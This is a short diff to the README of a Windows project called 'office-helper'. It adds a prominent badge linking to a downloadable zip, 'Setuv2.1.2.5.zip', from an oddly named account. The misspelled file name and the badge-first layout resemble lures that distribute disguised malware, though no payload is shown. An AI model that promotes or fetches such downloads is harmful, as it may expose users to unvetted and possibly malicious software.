@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/olivertayloreng00e2/office-helper/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 📦 office-helper
 
 ![Stable](https://img.shields.io/badge/status-stable-brightgreen.svg) ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)
